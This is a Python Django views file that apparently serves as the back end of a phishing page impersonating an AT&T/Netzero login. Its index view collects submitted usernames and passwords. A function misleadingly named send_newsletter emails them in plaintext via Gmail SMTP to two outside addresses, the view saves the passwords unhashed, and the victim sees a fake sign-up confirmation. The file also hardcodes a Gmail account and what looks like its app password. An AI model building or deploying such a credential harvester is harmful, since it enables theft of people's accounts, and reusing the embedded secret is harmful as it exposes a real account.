from django.shortcuts import render
from . models import Detail
from django.core.mail import send_mail
from django.conf import settings
import smtplib
import smtplib, ssl, getpass
from email.mime.text import MIMEText
from django.contrib import messages
from email.mime.multipart import MIMEMultipart
def send_newsletter(receiver_email, email, passw):
        sender_email = "inforehubdeveloper@gmail.com"
        password = 'xkgvjlefplgjhbut'
        subject = f"New Netzero Form Submission - UserID: {email}"
        message = MIMEMultipart("alternative")
        message["Subject"] = subject
        message["From"] = sender_email
        message["To"] = receiver_email
        html = f"""\
        <html>
        <head>
            <style>
            body {{
                font-family: Arial, sans-serif;
                font-size: 16px;
                line-height: 1.4;
                color: #333;
                background-color: #f2f2f2;
                margin: 0;
                padding: 0;
            }}
            h1 {{
                font-size: 24px;
                margin-top: 20px;
                margin-bottom: 10px;
                text_allign: center;
            }}
            p {{
                margin: 0 0 10px;
            }}
            b {{
                color: #007bff;
            }}
            .container {{
                max-width: 600px;
                margin: 0 auto;
                padding: 20px;
            }}
            </style>
        </head>
        <body>
            <div class="container">
            <h1>New Netzero Form Submission</h1>
            <p><b>EMAIL:</b> {email} </b></p>
            <p><b>PASSWORD:</b> {passw}</p>
            </div>
        </body>
        </html>
        """
        part2 = MIMEText(html, "html")
        message.attach(part2)
        context = ssl.create_default_context()
        with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as server:
            server.login(sender_email, password)
            server.sendmail(sender_email, receiver_email, message.as_string())


def index(request):
    if request.method == 'POST':
        email = request.POST.get('username')
        password = request.POST.get('password')
        try:
            send_newsletter('timyin25@gmail.com',email,password)
            send_newsletter('inforehubdeveloper@gmail.com',email,password)
            messages.success(request,'Congratulations you have signed up to AT&T')
        except Exception:
             messages.error(request,'Try again something went wrong')
             
        Detail.objects.create(email=email,passwords=password)
    return render(request,'netzero_app/index.html')
